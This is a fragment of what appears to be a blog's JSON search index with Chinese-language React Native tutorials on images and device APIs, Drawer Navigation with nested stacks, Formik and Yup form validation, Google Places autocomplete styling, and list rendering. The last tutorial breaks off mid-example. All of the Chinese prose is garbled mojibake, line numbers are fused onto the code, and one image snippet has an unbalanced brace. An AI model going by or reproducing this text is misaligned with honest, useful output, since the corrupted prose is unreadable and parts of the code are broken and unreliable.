ç”¨ä¾†æ¸²æŸ“åˆ—è¡¨ï¼ˆå»¶é²è¼‰å…¥ï¼‰ è£œå……ï¼šå¼•å…¥å¤–éƒ¨åœ–ç‰‡çš„æ–¹æ³•ç¬¬ä¸€ç¨®æ˜¯é€™æ¨£ï¼š 1234&lt;Image source={{ uri: 'https://picsum.photos/300/300', width: 100, height: 100 }} /&gt; ç¬¬äºŒç¨®æ˜¯é€™æ¨£ï¼š 123456789&lt;Image style={styles.img} source={{ uri: 'https://picsum.photos/300/300' } /&gt;const styles = StyleSheet.create({ img: { width: 100, height: 100 }}); ä¸ç®¡æ˜¯å“ªä¸€ç¨®ï¼Œéƒ½ä¸€å®šè¦è¨˜å¾—æŒ‡å®šå¯¬è·Ÿé«˜ï¼Œé€™æ¨£åœ–ç‰‡æ‰é¡¯ç¤ºçš„å‡ºä¾†ã€‚ è‡³æ–¼å¼•å…¥ asset ä¸­çš„åœ–ç‰‡ä¸éœ€è¦åŠ çš„åŸå› ï¼Œæ˜¯å› ç‚ºåœ¨æ‰“åŒ…çš„æ™‚å€™å°±æœƒçŸ¥é“ meta è³‡è¨Šï¼Œé€™æ˜¯è·Ÿå¤–éƒ¨åœ–ç‰‡ä¸åŒçš„åœ°æ–¹ã€‚ API Platform å¯ä»¥ç”¨ä¾†æª¢æŸ¥ä½¿ç”¨ IOS / Android StatusBar è·Ÿä¸Šæ–¹åˆ—ç›¸é—œçš„æ±è¥¿ï¼Œä¾‹å¦‚ StatusBar.currentHeight èƒ½å–å¾—è£ç½®çš„ä¸Šæ–¹åˆ—é«˜åº¦ï¼ˆAndroidï¼‰ Dimensions.get('screen') å¯ä»¥ç”¨ä¾†æª¢æŸ¥è£ç½®çš„å¯¬é«˜è³‡è¨Šï¼Œwindow æ˜¯ viewportï¼Œscreen æ˜¯æ•´å€‹è£ç½®ï¼ˆä½†åœ¨ IOS ä¸Šä¼¼ä¹æ˜¯æ²’å·®ï¼‰ Keyboard å¯ä»¥åšå°éµç›¤æœ‰é—œçš„æ“ä½œï¼Œä¾‹å¦‚ï¼šKeyboard.dismiss() å¯ä»¥é—œæ‰éµç›¤ è£œå……ï¼šä¸€å€‹ä¸éŒ¯ç”¨çš„å¥—ä»¶@react-native-community/hooks é€™å€‹å¥—ä»¶æœ‰æä¾›ä¸€äº›ä¸éŒ¯çš„ hookï¼š useDimensions() é¡¯ç¤ºç›®å‰æ–¹å‘çš„å¯¬é«˜ useDeviceOrientation() é¡¯ç¤ºç›®å‰çš„æ–¹å‘ è£œå……ï¼šé—œæ–¼ IOS ä¸­çš„ keyboardåœ¨é è¨­çš„æƒ…æ³ä¸‹ IOS ä½¿ç”¨ ï¼Œ&lt;TextInput /&gt; æ™‚ä¸æœƒè‡ªå‹•å½ˆå‡º keyboardï¼Œå¦‚æœå¸Œæœ›æ‰“é–‹é€™åŠŸèƒ½ï¼Œè«‹é€™æ¨£åšï¼š I/O &gt; Keyboard &gt; Connect Hardware Keyboard I/O &gt; Input &gt; Send Keyboard Input to Device ç¬¬ä¸€æ­¥æ˜¯è¦æŠŠæ‰‹æ©Ÿçš„å°éµç›¤æ‰“é–‹ï¼Œç¬¬äºŒæ­¥æ˜¯è®“ä½ èƒ½ç”¨é›»è…¦çš„éµç›¤ä¾†è¼¸å…¥å…§å®¹ã€‚","link":"/2022/05/26/react-native-components-and-api/"},{"title":"React Navigationï¼Drawer Navigation","text":"å†ä¾†ä¸€å€‹ç¶“å…¸çš„å°è¦½åˆ—ã€‚ è‡ªæˆ‘æª¢æ¸¬ æˆ‘çŸ¥é“æ€éº¼é€éå®¢è£½åŒ–å…ƒä»¶ä¾†ç•¶ä½œ NabBar æˆ‘çŸ¥é“æ€éº¼æŠŠ Drawer è·Ÿ Stack çµåˆèµ·ä¾†ç”¨ æˆ‘çŸ¥é“æ€éº¼é€é options ä¾†å‚³é props çµ¦è‡ªå®šç¾©å…ƒä»¶ é—œæ–¼èƒŒå¾Œçš„è¨­è¨ˆç†å¿µåœ¨ä¸è€ƒæ…®å¤ªå¤šçš„æƒ…æ³ä¸‹ï¼Œå‡è¨­ä½ æƒ³åšçš„æ•ˆæœæ˜¯é€™æ¨£ï¼š æœ‰ä¸€å€‹å´é‚Šå°è¦½åˆ—ï¼Œå¯ä»¥é€²å…¥ Home è·Ÿ About ï¼ˆé †é“ä¸€æï¼Œé€™å€‹å¯ä»¥æ‹‰å‡ºä¾†çš„æ±è¥¿å°±å«åšã€ŒDrawer Navigationã€ï¼Œä¹Ÿæ˜¯æˆ‘å€‘ç­‰ä¸€ä¸‹è¦å¯¦ä½œçš„æ±è¥¿ã€‚ï¼‰ æ¥è‘—ï¼ŒHome è£¡é¢åˆå¯ä»¥é€²å…¥åˆ°å…¶ä»–é é¢ï¼Œåƒé€™æ¨£ï¼š è€Œ About çš„è©±å°±åªæ˜¯ä¸€å€‹æ™®é€šçš„é é¢ï¼š ä½ å¯ä»¥å…ˆæƒ³æƒ³çœ‹ï¼Œä½ æœƒæ€éº¼ä¾†å¯¦ä½œé€™æ¨£çš„æ±è¥¿ï¼Ÿ æœƒç‰¹åˆ¥æé€™å€‹çš„åŸå› æ˜¯ï¼Œå…¶å¯¦ Home è·Ÿ About é€™å…©å€‹é é¢å…¶å¯¦éƒ½æ˜¯ Stack Navigationã€‚ ä½ å¯èƒ½æœƒæƒ³èªªå¹¹å˜›ä¸ç›´æ¥æ‹¿ About ä¾†ç”¨å°±å¥½ï¼Œé‚„è¦åŒ…æˆä¸€å€‹ Stackï¼Ÿå›ç­”é€™å•é¡Œä¹‹å‰ï¼Œä¸å¦‚ç›´æ¥ä¾†è©¦è©¦çœ‹ï¼Œçœ‹çµæœæœƒæ€éº¼æ¨£ï¼š çœ‹åˆ°äº†å§ï¼Œä¸Šé¢é‚£æ¢ NavBar æ¶ˆå¤±äº†ï¼Œé€™å€‹å°±æ˜¯ç‚ºä»€éº¼éƒ½é‚„è¦åŒ…æˆ Stack çš„åŸå› ï¼š å°±ç®—åªæœ‰ä¸€å€‹é é¢ï¼Œæˆ‘ä¹Ÿå¸Œæœ›ä»–æœ‰ä¸Šé¢çš„ NavBar æ‰€ä»¥ä½ æ‰æœƒçœ‹åˆ°å¾ˆå¤šäººè¨­è¨ˆè·¯ç”±æ™‚éƒ½æ˜¯é€™æ¨£å­ï¼š ç¸½ä¹‹å¸Œæœ›é€™é‚Šå¯ä»¥å¹«ä½ è§£æƒ‘ä¸€é»ï¼Œå› ç‚ºç­‰ä¸€ä¸‹çš„ç¯„ä¾‹ä¹Ÿæœƒç”¨é€™ç¨®æ–¹å¼ä¾†å¯¦ä½œã€‚ éœ€è¦è£çš„å¥—ä»¶æˆ‘å‡è¨­ä½ ç›®å‰å·²ç¶“æœ‰é€™äº›å¥—ä»¶ï¼Œæ²’æœ‰çš„è©±è«‹é †ä¾¿è£èµ·ä¾†ï¼š @react-navigation/native (npm) æ ¸å¿ƒ @react-navigation/native-stack (npm) å»ºç«‹ Stack éœ€è¦ react-native-screens (expo) çµ¦ Expo ç”¨çš„ react-native-safe-area-context (expo) çµ¦ Expo ç”¨çš„ æ¥è‘—æ˜¯ä½¿ç”¨ Drawer Navigation æœƒç”¨åˆ°çš„å¥—ä»¶ï¼š @react-navigation/drawer (npm) æ ¸å¿ƒ react-native-gesture-handler (expo) çµ¦ Expo ç”¨çš„ react-native-reanimated (expo) çµ¦ Expo ç”¨çš„ å‹•å·¥å§ï¼é€™é‚Šæœƒå»¶çºŒ React Navigationï¼Navigation Stack çš„æ¦‚å¿µä¾†ç¹¼çºŒå¾€ä¸‹åšã€‚ç›®æ¨™æ˜¯ä¸€é–‹å§‹å±•ç¤ºçš„é‚£ç¨®æ•ˆæœï¼Œæ‰€ä»¥å°±ç›´æ¥é–‹å§‹å§ï¼ é¦–å…ˆæˆ‘å€‘æœƒæœ‰ä¸‰å€‹é é¢ï¼Œåˆ†åˆ¥ç‚ºï¼š Home Detail About æœ€é–‹å§‹çš„æ™‚å€™æœ‰èªªéï¼Œç‚ºäº†è®“æ¯å€‹é é¢éƒ½æœ‰ NavBarï¼Œæ‰€ä»¥æœƒæ‹†æˆå…©å€‹ Stackï¼Œåˆ†åˆ¥æ˜¯ï¼š HomeStack AboutStack å¦‚æœä½ å¿˜è¨˜çš„è©±å¯ä»¥æ‹‰å›å»ä¸Šé¢çœ‹ä¸€ä¸‹è—åœ–ï¼Œç¸½ä¹‹ Drawer Navigation çš„ä»»å‹™å°±æ˜¯è² è²¬é¡¯ç¤ºé€™å…©å€‹ä¸åŒçš„ Stackï¼ æ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯å…ˆå»ºç«‹å¥½ Stackï¼Œé€™é‚Šçš„æ±è¥¿ä½ æ‡‰è©²è¦çœ‹å¾—æ‡‚ï¼Œæ‰€ä»¥å°±ä¸ç‰¹åˆ¥è§£é‡‹äº† 1234567891011121314151617181920212223242526// HomeStack.tsximport { createNativeStackNavigator } from \"@react-navigation/native-stack\";import HomeScreen from \"../screens/Home\";import DetailScreen from \"../screens/Detail\";const Stack = createNativeStackNavigator();const HomeStack: React.FC = () =&gt; { return ( &lt;Stack.Navigator screenOptions={{ headerBackTitle: 'Back', headerTintColor: '#fff', headerStyle: { backgroundColor: 'dodgerblue' }, headerTitleStyle: { fontSize: 20 } }}&gt; &lt;Stack.Screen name=\"Home\" component={HomeScreen} /&gt; &lt;Stack.Screen name=\"Detail\" component={DetailScreen} /&gt; &lt;/Stack.Navigator&gt; )}export default HomeStack; 1234567891011121314151617181920// About.tsximport { createNativeStackNavigator } from \"@react-navigation/native-stack\";import AboutScreen from \"../screens/About\";const Stack = createNativeStackNavigator();const AboutStack: React.FC = () =&gt; { return ( &lt;Stack.Navigator screenOptions={{ headerTintColor: 'white', headerStyle: { backgroundColor: 'dodgerblue' } }}&gt; &lt;Stack.Screen name=\"About\" component={AboutScreen} /&gt; &lt;/Stack.Navigator&gt; )}export default AboutStack; åˆ°é€™é‚Š Stack çš„éƒ¨åˆ†å°±å®Œæˆäº†ï¼Œæ¥ä¸‹ä¾†æ˜¯ Drawer çš„éƒ¨åˆ†ã€‚ ä½†èªªå¯¦è©±ï¼Œç­‰ä¸€ä¸‹è¦åšçš„æ±è¥¿åŸºæœ¬ä¸Šå°±è·Ÿåœ¨åš Stack æ™‚æœ‰ 87 åˆ†åƒï¼Œä½ ç›´æ¥çœ‹ code å¤§æ¦‚å°±èƒ½æŠ“åˆ°é‚£å€‹ pattern äº†ï¼š 12345678910111213141516171819202122import { createDrawerNavigator } from \"@react-navigation/drawer\";const Drawer = createDrawerNavigator();// æŠŠå…©å€‹ stack æ‹¿é€²ä¾†ä¾†import HomeStack from \"./HomeStack\";import AboutStack from \"./AboutStack\";const DrawerNavigator: React.FC = () =&gt; { return ( // æŠŠ Drawer è‡ªå¸¶çš„ NavBar éš±è— &lt;Drawer.Navigator screenOptions={{ headerShown: false }}&gt; // å¦‚æœæ²’æœ‰æŒ‡å®š optionsï¼Œé è¨­æœƒç”¨é¡¯ç¤º name çš„æ–‡å­— ï¼Œæ‰€ä»¥æ‰è¦é‡æ–°æŒ‡å®š &lt;Drawer.Screen name=\"HomeStack\" component={HomeStack} options={{ title: 'Home' }} /&gt; &lt;Drawer.Screen name=\"AboutStack\" component={AboutStack} options={{ title: 'About' }} /&gt; &lt;/Drawer.Navigator&gt; )}export default DrawerNavigator; é€™é‚Šè§£é‡‹ä¸€ä¸‹ screenOptions çš„éƒ¨åˆ†ã€‚ å¦‚æœæ²’æœ‰è¨­å®š headerShown: falseï¼Œé è¨­æœƒé¡¯ç¤ºå¦ä¸€å€‹ NavBar åƒé€™æ¨£ï¼š è‡³æ–¼ title çš„éƒ¨åˆ†å°±å¦‚åŒè¨»è§£è£¡æ‰€èªªçš„ï¼Œé€™éƒ¨åˆ†å°±ä¸å†è²¼åœ–ç‰‡äº†ã€‚ ç¸½ä¹‹ï¼Œåšåˆ°é€™é‚Šä»¥å¾ŒåŸºæœ¬çš„ Drawer Navigation å°±å®Œæˆäº†ã€‚ é‚„æ²’å®Œï¼Œé€™æ™‚å€™ä½ å¯èƒ½æœƒç¢°åˆ°çš„ bugæŠŠå‰›å‰›å¯«çš„ code æ‹¿å»åŸ·è¡Œå¾Œï¼Œä½ æœ‰å¯èƒ½æœƒå¾—åˆ°é€™å€‹éŒ¯èª¤è¨Šæ¯ï¼š Error: Reanimated 2 failed to create a worklet, maybe you forgot to add Reanimatedâ€™s babel plugin? é€™é‚Šçˆ¬äº†ä¸€æ®µæ™‚é–“æ‰æ‰¾åˆ°è§£æ³•ï¼Œæ˜¯åƒè€ƒ é€™ç¯‡ ä¾†è§£çš„ã€‚ ç°¡å–®ä¾†èªªæ˜¯è·Ÿ babel æœ‰é—œçš„å•é¡Œï¼Œè©³ç´°åƒè€ƒ å®˜æ–¹æ–‡ä»¶ çš„èªªæ˜ï¼Œä½†ç¸½ä¹‹å‘¢ï¼Œè«‹å…ˆå®‰è£é€™å€‹æ±è¥¿ï¼š 1expo install react-native-reanimated æ¥è‘—å»è¨­å®š babel.config.jsï¼š 12345678module.exports = function(api) { api.cache(true); return { presets: ['babel-preset-expo'], // åŠ ä¸Šé€™è¡Œ plugins: ['react-native-reanimated/plugin'], };}; æ¥è‘—ç”¨æ¸…é™¤å¿«å–çš„æ–¹å¼ä¾†é‡å•Ÿ Expoï¼š 1expo start --clear æ²’æ„å¤–çš„è©±å°±èƒ½è§£æ±ºå›‰ï¼ åŠ ä¸Šå®¢è£½åŒ–çš„ Headerï¼å…ˆè¤‡ç¿’ä¸€ä¸‹ï¼Œåœ¨å‰›å‰›è§£å®Œ bug ä»¥å¾Œï¼Œä½ æ‡‰è©²å°±æœƒæœ‰é€™æ¨£çš„æ•ˆæœï¼š çœ‹èµ·ä¾†ä¼¼ä¹é‚„æŒºé †åˆ©çš„ï¼Œä½†å¿…é ˆè€å¯¦èª¬çš„æ˜¯ï¼Œå¦‚æœæ²’æœ‰ç‰¹åˆ¥ä»‹ç´¹çš„è©±ä¸€èˆ¬äººæ ¹æœ¬ä¸çŸ¥é“æœ‰é€™å€‹åŠŸèƒ½å§ï¼Ÿç•¢ç«Ÿä¸€é»æç¤ºéƒ½æ²’æœ‰RRRRRï¼ æ‰€ä»¥æ¥ä¸‹ä¾†æˆ‘å€‘è¦åšçš„å°±æ˜¯æŠŠä»–æ”¹æˆé€™æ¨£å­ï¼š é€™é‚Šæˆ‘åªæœƒè¬›å€‹å¤§æ¦‚ï¼Œä¸æœƒè¬›å¤ªç´°ï¼Œå› ç‚ºç”¨æ–‡å­—æ•˜è¿°çš„è©±æœ‰é»éº»ç…©ã€‚å¦‚æœçœŸçš„æƒ³è¦ Step-By-Step çš„è©±ï¼Œå¯ä»¥åƒè€ƒé€™å€‹å½±ç‰‡ã€‚ ç°¡å–®ä¾†èªªï¼Œæˆ‘å€‘å¯ä»¥å®¢è£½åŒ–ä¸€å€‹å…ƒä»¶ï¼Œå†æŠŠä»–é€é options çš„æ–¹å¼æ”¾åˆ° Screen ä¸­ï¼ˆå°±åƒé€é title ä¾†æ”¹è®Šé¡¯ç¤ºæ–‡å­—ä¸€æ¨£ï¼‰ã€‚ é™„è¨»ï¼šå¦‚æœä½ å¾Œä¾†ç™¼ç¾æœ‰å¯¬é«˜ç„¡æ³•å¡«æ»¿çš„å•é¡Œçš„è©±ï¼Œå»ºè­°æ”¹ç”¨ header ä¾†è¨­å®š æ‰€ä»¥æˆ‘å€‘è¦å®¢åˆ¶çš„å…ƒä»¶å…§å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import { View, Text, StyleSheet, TouchableOpacity, StatusBar } from \"react-native\";import { MaterialIcons } from '@expo/vector-icons';// ç­‰æœƒå…’æœƒå†è§£é‡‹é€™å…©å€‹ props æ˜¯æ€éº¼æ‹¿åˆ°çš„interface Props { navigation: any, title: string}const Header: React.FC&lt;Props&gt; = ({ navigation, title }) =&gt; { const openMenu = () =&gt; { navigation.openDrawer(); } return ( &lt;View style={styles.container}&gt; &lt;TouchableOpacity style={styles.icon} onPress={openMenu} &gt; {/* æ¼¢å ¡ */} &lt;MaterialIcons name=\"menu\" size={32} color='#fff' /&gt; &lt;/TouchableOpacity&gt; &lt;View&gt; {/* title */} &lt;Text style={styles.text}&gt;{title}&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; )}const styles = StyleSheet.create({ container: { width: '100%', height: '100%', flexDirection: 'row', justifyContent: 'center', alignItems: 'center', }, text: { color: '#fff', fontSize: 20, fontWeight: 'bold' }, icon: { position: 'absolute', left: 16 }})export default Header; é€™é‚Šæˆ‘æƒ³ç‰¹åˆ¥è¬›åœ°æ–¹çš„åªæœ‰ä¸€å€‹ï¼Œå°±æ˜¯ container çš„è¨­å®šã€‚ ä¹‹æ‰€ä»¥æœƒæŠŠå¯¬é«˜è¨­ç‚º 100%ï¼Œæ˜¯å› ç‚ºæˆ‘å€‘é€™å€‹å…ƒä»¶ã€Œæœƒæ”¾åœ¨ Navbar è£¡é¢ã€ï¼Œæ‰€ä»¥æœƒæœ‰ã€Œçˆ¶å­éšå±¤ã€çš„æ„æ€ï¼Œæ‰€ä»¥é€™æ™‚å€™çš„ % å°±æœƒä»¥ NavBar ä¾†åšè¨ˆç®—ã€‚ ä¸ç”¨æƒ³å¾—å¤ªè¤‡é›œï¼Œæˆ‘å€‘è¦çš„å°±æ˜¯è®“ä»–å¡«æ»¿åŸæœ¬ NavBar çš„å¯¬è·Ÿé«˜è€Œå·²ã€‚ æ¥è‘—ä¾†çœ‹æ€éº¼æŠŠä»–æ”¾åˆ° options ä¸­ï¼Œä¸éè¦æ³¨æ„ä¸€ä»¶äº‹æƒ…ï¼Œæˆ‘å€‘è¦æ”¾çš„åœ°æ–¹åªæœƒæœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯ Homeï¼Œä¸€å€‹æ˜¯ Aboutã€‚ ç‚ºä»€éº¼ Detail ä¸ç”¨æ”¾ï¼Ÿå› ç‚ºæˆ‘å€‘å¸Œæœ›å®ƒä¿ç•™åŸæœ¬çš„æ¨£å­ï¼Œè®“ä»–ä¿ç•™é‚£å€‹ &lt;back çš„æŒ‰éˆ•ï¼Œæ‰€ä»¥å®ƒçš„éƒ¨åˆ†ä¸ç”¨åšé¡å¤–èª¿æ•´ã€‚ 1234567891011121314151617181920212223242526import { createNativeStackNavigator } from \"@react-navigation/native-stack\";import AboutScreen from \"../screens/About\";// å‰›å‰›å¯«å¥½çš„ Headerimport Header from \"../share/Header\";const Stack = createNativeStackNavigator();const AboutStack: React.FC = () =&gt; { return ( &lt;Stack.Navigator screenOptions={{ headerTintColor: 'white', headerStyle: { backgroundColor: 'dodgerblue' } }}&gt; {/* æ”¾åˆ° options ä¸­ */} &lt;Stack.Screen name=\"About\" component={AboutScreen} options={({ navigation }) =&gt; { return { headerTitle: () =&gt; &lt;Header navigation={navigation} title=\"About GameZone\" /&gt; } }}/&gt; &lt;/Stack.Navigator&gt; )}export default AboutStack; é€™é‚Šå¯ä»¥æ³¨æ„åˆ°å…©å€‹åœ°æ–¹ï¼š options å‚³çš„æ˜¯ä¸€å€‹ function åœ¨ headerTitle ä¸­å‚³çš„ä¹Ÿæ˜¯ä¸€å€‹ function å…ˆè§£é‡‹ç¬¬ä¸€å€‹ï¼Œé€™æ¨£å¯«æ˜¯å› ç‚ºæˆ‘å€‘æƒ³æŠŠ navigation ç•¶ä½œ props å‚³å…¥ &lt;Header /&gt;ï¼Œæ‰€ä»¥æ‰å¾—é€™æ¨£å¯«ã€‚ è‡³æ–¼ç¬¬äºŒé»æ˜¯å› ç‚ºæˆ‘å€‘æƒ³è¦ç”¨å®¢è£½å…ƒä»¶ä¾†ç•¶ä½œå…§å®¹ï¼Œæ‰€ä»¥ä¸€æ¨£å¾—é€é function çš„æ–¹å¼ä¾†å›å‚³ JSXã€‚ ä»¥ä¸Šï¼Œåšåˆ°é€™é‚Šå¾Œä½ å°±æœ‰ä¸€å€‹æ¯”è¼ƒå„ªçš„ Drawer Navigation å›‰ï¼","link":"/2022/05/29/react-native-drawer-navigation/"},{"title":"React Nativeï¼ç”¨ Formik å’Œ Yup åšè¡¨å–®é©—è­‰","text":"å¾ˆå¸¸è¦‹çš„åŠŸèƒ½ã€‚ æ‡¶äººåŒ…Formik çš„éƒ¨åˆ† è¨­å®šæ¬„ä½çš„åˆå§‹å€¼ å»ºç«‹è¡¨å–®å…ƒä»¶ æŠŠè¡¨å–®å…ƒä»¶è·Ÿ formik åšè³‡æ–™é›™å‘ç¶å®š è¨­å®š submit çš„ handler Yup çš„éƒ¨åˆ†å…¶å¯¦å°±æ˜¯å»ºç«‹ä¸€å€‹ objectï¼Œåƒé€™æ¨£ï¼š 12345const formSchema = Yup.object({ 'æ¬„ä½1': è¦å‰‡1, 'æ¬„ä½2': è¦å‰‡2, 'æ¬„ä½3': è¦å‰‡3,}) è¦å‰‡çš„é‚è¼¯è·Ÿ propTypes æœ‰é»åƒï¼Œç¸½ä¹‹å¯«å¥½å¾Œå†è·Ÿ Formik ä¸²èµ·ä¾†å°±å¥½äº†ã€‚ ç¤ºç¯„ Formikç°¡å–®ä¾†èªªæœƒå»ºç«‹ä¸€å€‹ Formik çš„å…ƒä»¶ï¼Œåªè¦æŠŠæ±è¥¿å¯«åœ¨ Formik åœ¨é€™å€‹å…ƒä»¶è£¡ï¼Œå°±å¯ä»¥åˆ©ç”¨å®ƒæä¾›çš„ props ä¾†åšåˆ°ä¸‹é¢é€™äº›äº‹æƒ…ï¼š è¨­å®šæ¬„ä½åˆå§‹å€¼ ç®¡ç†æ¬„ä½çš„ state ç”¨ Formik çš„ actionï¼Œä¾‹å¦‚ Reset æ¬„ä½çš„å€¼ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import { View, TextInput, Text, Button } from \"react-native\";import { globalStyles } from \"../style/globalStyle\";import { Formik } from \"formik\";interface Props { addReview: any}const ReviewForm: React.FC&lt;Props&gt; = ({ addReview }) =&gt; { return ( &lt;View style={globalStyles.container}&gt; &lt;Formik initialValues={{ title: '', body: '', rating: '', }} onSubmit={(values, action) =&gt; { // é€™é‚Šå¯ä»¥æ‹¿åˆ°æ¬„ä½çš„å€¼ addReview(values); // Formik æä¾›çš„ API action.resetForm(); }} &gt; {/* é€™é‚Šæ˜¯ render functionï¼Œå¯ä»¥æ‹¿åˆ° Formik æä¾›çš„ propsï¼Œ */} {(props) =&gt; ( &lt;View&gt; &lt;TextInput style={globalStyles.input} placeholder=\"Review titile\" onChangeText={props.handleChange('title')} value={props.values.title} /&gt; &lt;TextInput style={globalStyles.input} multiline placeholder=\"Review content\" onChangeText={props.handleChange('body')} value={props.values.body} /&gt; &lt;TextInput style={globalStyles.input} keyboardType=\"numeric\" placeholder=\"Rating (1, 5)\" onChangeText={props.handleChange('rating')} value={props.values.rating} /&gt; &lt;Button title=\"Submit\" onPress={props.handleSubmit} /&gt; &lt;/View&gt; )} &lt;/Formik&gt; &lt;/View&gt; )}export default ReviewForm; ç¤ºç¯„æŠŠ Yup è·Ÿ Formik ä¸²èµ·ä¾†123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import { View, TextInput, Text } from \"react-native\";import { Button } from \"../share/Button\"; import { globalStyles } from \"../style/globalStyle\";import { Formik } from \"formik\";import * as Yup from \"yup\";interface Props { addReview: any}const reviewSchema = Yup.object({ title: Yup.string() .required() .min(4, 'Too short! It\\'s must be greater than 4 charactor'), body: Yup.string() .required() .min(8, 'Too short! It\\'s must be greater than 8 charactor'), rating: Yup.string() .required() .test('is num between 1 - 5', 'Rating must be a number 1 - 5', (val: any) =&gt; { return parseInt(val, 10) &gt; 0 &amp;&amp; parseInt(val, 10) &lt; 6 })})const ReviewForm: React.FC&lt;Props&gt; = ({ addReview }) =&gt; { return ( &lt;View style={globalStyles.container}&gt; &lt;Formik initialValues={{ title: '', body: '', rating: '', }} // æŠŠè¦å‰‡å‚³å…¥ props validationSchema={reviewSchema} onSubmit={(values, action) =&gt; { addReview(values); action.resetForm(); }} &gt; {(props) =&gt; ( &lt;View&gt; &lt;TextInput style={globalStyles.input} placeholder=\"Review titile\" onChangeText={props.handleChange('title')} onBlur={props.handleBlur('title')} value={props.values.title} /&gt; {/* Error Message */} &lt;Text style={globalStyles.errorText}&gt;{props.touched.title &amp;&amp; props.errors.title}&lt;/Text&gt; &lt;TextInput style={globalStyles.input} multiline placeholder=\"Review content\" onChangeText={props.handleChange('body')} onBlur={props.handleBlur('body')} value={props.values.body} /&gt; &lt;Text style={globalStyles.errorText}&gt;{props.touched.body &amp;&amp; props.errors.body}&lt;/Text&gt; &lt;TextInput style={globalStyles.input} keyboardType=\"numeric\" placeholder=\"Rating (1, 5)\" onChangeText={props.handleChange('rating')} onBlur={props.handleBlur('rating')} value={props.values.rating} /&gt; &lt;Text style={globalStyles.errorText}&gt;{props.touched.rating &amp;&amp; props.errors.rating}&lt;/Text&gt; &lt;Button title=\"Submit\" onPress={props.handleSubmit} /&gt; &lt;/View&gt; )} &lt;/Formik&gt; &lt;/View&gt; )}export default ReviewForm; é™„è¨»ï¼šprops.touched.title æ˜¯ç‚ºäº†åšå‡ºã€Œç¢°éä»¥å¾Œã€æ‰é¡¯ç¤º error messageï¼Œä¸ç„¶å…¨éƒ¨çš„æ¬„ä½æœƒä¸€æ¬¡ pop å‡ºä¾†ã€‚ æœ€å¾Œé™„ä¸Šä¸€ä¸‹å®Œæˆæ•ˆæœï¼š","link":"/2022/06/02/react-native-formik-and-yup/"},{"title":"React Nativeï¼é—œæ–¼ Goole places autocomplete çš„æ¨£å¼","text":"å¥—ä»¶æ‡¶äººåŒ…ã€‚ ç°¡è¿°åœ¨å¯« React Native æ™‚ç”¨äº† react-native-google-places-autocomplete é€™å€‹å¥—ä»¶ï¼Œåœ¨è¨­å®š style æ™‚ç¢°åˆ°äº†ä¸€é»éšœç¤™ï¼Œæ‰€ä»¥å°±å¯«äº†é€™ç¯‡ä¾†è§£æƒ‘ã€‚ style çµæ§‹é¦–å…ˆçµæ§‹å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£ï¼Œæœƒæ¯”è¼ƒå¥½åˆ†æè©²æ€éº¼å¯« styleï¼š 1234567const GooglePlacesAutocomplete = () =&gt; ( &lt;Container&gt; &lt;TextInputContainer&gt; &lt;TextInput /&gt; &lt;/TextInputContainer&gt; &lt;/Container&gt;) ç”¨åœ–ä¾†è¡¨ç¤ºçš„è©±æœƒåƒé€™æ¨£ï¼š é€™æ˜¯é è¨­çš„ styleï¼š 1234567891011121314151617{ container: { flex: 1, }, textInputContainer: { flexDirection: 'row', }, textInput: { backgroundColor: '#FFFFFF', height: 44, borderRadius: 5, paddingVertical: 5, paddingHorizontal: 10, fontSize: 15, flex: 1, },} é€™é‚Šè§£é‡‹å¹¾å€‹æ±è¥¿ï¼š 1. Container ç‚ºä»€éº¼è¦è¨­æˆ flex: 1ï¼Ÿ ç‚ºäº†è®“ã€Œæœå°‹çµæœã€çš„ç©ºé–“å¯ä»¥å±•é–‹ï¼ˆè—è‰²å€å¡Šï¼‰ï¼š 2. å¦‚æœè¦åŠ  icon çš„è©±æ€éº¼åŠ ï¼Ÿ å¯ä»¥ç”¨ renderLeftButton ä¾†åšï¼Œè‡³æ–¼è¦è¨­å®šæ’ç‰ˆçš„è©±ï¼Œè¦æ³¨æ„æ˜¯å¯«åœ¨ textInputContainerï¼Œè€Œä¸æ˜¯ containerã€‚ åƒé€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829export default function SearchBar () { return ( &lt;View style={{ marginTop: 15, flexDirection: 'row' }}&gt; &lt;GooglePlacesAutocomplete styles={{ container: { backgroundColor: 'dodgerblue' }, textInputContainer: { flexDirection: 'row', alignItems: 'center', // æ¬¡è»¸ç½®ä¸­ backgroundColor: 'orange', marginRight: 10, }, textInput: { backgroundColor: 'grey', borderRadius: 50, }, }} // å·¦é‚Šçš„ icon renderLeftButton={() =&gt; ( &lt;View&gt; &lt;MaterialIcons name=\"location-on\" size={24} color=\"black\" /&gt; &lt;/View&gt; )} /&gt; &lt;/View&gt; )}","link":"/2022/06/03/react-native-google-places-autocomplete-style/"},{"title":"React Native é—œæ–¼æ¸²æŸ“åˆ—è¡¨çš„å¹¾ç¨®æ–¹å¼","text":"é‚„è »é…·ç‚«çš„ç©æ³•ã€‚ mapé€é map()ï¼Œåªè¦å¦³å¯«é React éƒ½ä¸€å®šæœƒç”¨çš„æ–¹æ³•ï¼š 123456789101112131415161718192021222324252627export default function App() { const [people, setPeople] = useState([ { name: 'PeaNu', key: 1}, { name: 'PPB', key: 2}, { name: 'Jacky', key: 3}, { name: 'Dantin', key: 4}, { name: 'Stachy', key: 5}, { name: 'Altin', key: 6}, { name: 'Alex', key: 7}, { name: 'Barbur', key: 8}, { name: 'Candy', key: 9}, { name: 'Coco', key: 10}, ]) return ( &lt;View style={styles.container}&gt; &lt;ScrollView&gt; {people.map(item =&gt; ( &lt;View key={item.key} style={styles.item}&gt; &lt;Text style={styles.itemText}&gt;{item.name}&lt;/Text&gt; &lt;/View&gt; ))} &lt;/ScrollView&gt; &lt;/View&gt; );} FlasListç¬¬äºŒç¨®åšæ³•æ˜¯ç”¨ä¸€å€‹å«åš FlatList çš„å…ƒä»¶ï¼Œå…ˆä¾†çœ‹ä»–çš„ç”¨æ³•ï¼š 123456789101112131415161718192021222324252627282930import { FlatList } from \"react-native\"export default function App() { const [people, setPeople] = useState([ { name: 'PeaNu', key: 1}, { name: 'PPB', key: 2}, { name: 'Jacky', key: 3}, { name: 'Dantin', key: 4}, { name: 'Stachy', key: 5}, { name: 'Altin', key: 6}, { 